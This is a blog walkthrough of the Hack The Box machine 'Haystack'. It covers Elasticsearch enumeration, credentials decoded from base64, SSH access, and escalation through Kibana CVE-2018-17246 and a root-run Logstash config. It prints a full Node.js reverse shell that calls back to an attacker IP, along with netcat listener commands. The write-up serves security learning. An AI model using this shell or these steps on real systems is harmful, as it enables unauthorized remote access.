---
layout: post
title: Haystack Writeup
date: '2019-11-19 14:43:00'
tags:
- hack-the-box
---

## Enumeration

Starting with Autorecon we can see &nbsp;hat ports 80, 22 and 9200 are open. Looking at port 80 we can see it just displays a picture

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-22-19h49m58s866.png" class="kg-image"></figure>

I thought this was just nice illustration, needle in a haystack etc, &nbsp;though this was me not being used to CTF style clues. If you download &nbsp;the file and use `strings` on it you'll find a base64 encoded clue for searching. However, I did this the hard way!

Moving onto some Nmap output it showed 9200 was running Elasticsearch

`9200/tcp open  elasticsearch syn-ack ttl 63 Elastic elasticsearch 6.4.2`

## Initial Exploitation

Good stuff, so next we have a look at what indexes are available

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-22-19h59m47s931.png" class="kg-image"></figure>

So, two instances and it looks like Kibana is installed somewhere. I &nbsp;tried elasticdump at this point but couldn't get it to work. I then ran a &nbsp;query to return all the results in the quotes index and saved them to a &nbsp;file.

<figure class="kg-card kg-image-card kg-width-wide"><img src="/content/images/2019/11/vlcsnap-2019-07-22-20h04m59s464.png" class="kg-image"></figure>

I then grepped for various words translated to Spanish such as needle, &nbsp;haystack etc. which was on the correct path but the wrong word. In the &nbsp;end I just scanned through the entries manually until I noticed a base64 &nbsp;encoded one

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-22-20h08m58s936.png" class="kg-image"></figure>

Decoding this we get

    root@RD1734747W10:~/hackthebox/haystack# echo cGFzczogc3BhbmlzaC5pcy5rZXk= |base64 -d
    pass: spanish.is.key

Okay, now we need to find the username. I try a couple of different &nbsp;greps based on the word in the sentence with the password, before trying &nbsp;_clave_ which is Spanish for key. Obvious really!

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-22-20h13m30s471.png" class="kg-image"></figure>

The second bit of base64 decodes as

    root@RD1734747W10:~/hackthebox/haystack# echo dXNlcjogc2VjdXJpdHkg | base64 -d
    user: security

Good stuff, lets see if that works to ssh into the box

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-22-20h17m22s277.png" class="kg-image"></figure>

Yup, and we can grab the user flag. On to root.

## Escalating Privileges

### Enumeration: Part 2

At this point we need to start enumerating again to see what we can see from our new position. Doing a `ps` it looked like Kibana was running, was wasn't unexpected given the presence of Elasticsearch. Running `ss state listening` showed Kibana listening on 5601.

### Compromising another account

Knowing from the nmap that the Kibana version was likely the same as the &nbsp;Elasticsearch, 6.4.2, I searched for any exploits and found &nbsp;[https://github.com/mpgn/CVE-2018-17246/](https://github.com/mpgn/CVE-2018-17246/) &nbsp;which look promising.

I saved the shell:

    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(4096, "10.10.14.12", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();

on my Kali box and the used `scp` to copy it to `\tmp` on the server. I started a listener on Kali with `nc -lvp 4096` and then when logged in as `security` on the server I ran

<figure class="kg-card kg-image-card kg-width-wide"><img src="/content/images/2019/11/vlcsnap-2019-07-23-16h55m08s672.png" class="kg-image"></figure>

and caught the shell in the other window. I did have an issue that took a &nbsp;bit of searching to fix. If the connection dies for any reason &nbsp;re-running the command fails. If you rename `shell.js` to `shell2.js` (or anything else really) it will work again.

### Enumeration: Part 3

Now we are the Kibana user, it's time to enumerate again to see what we have access to now. &nbsp;I used [LinEnum](https://github.com/rebootuser/LinEnum) for this.

LinEnum turned up some interesting files in `/etc/logstash/conf.d/` which meant that any files created with the name starting with `/opt/kibana/logstash_*` and the correct line would be executed by the logstash process which runs as root!

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-23-17h15m41s319.png" class="kg-image"></figure>
### Escalation to root

So to exploit this we create a file, `/opt/kibana/logstash_shell` and start a listener `nc -lvp 8080` We then put the following in the file and wait...

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-23-17h18m59s311.png" class="kg-image"></figure>

We get a connection back to the listener and the root flag, job done.

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-23-17h20m21s470.png" class="kg-image"></figure>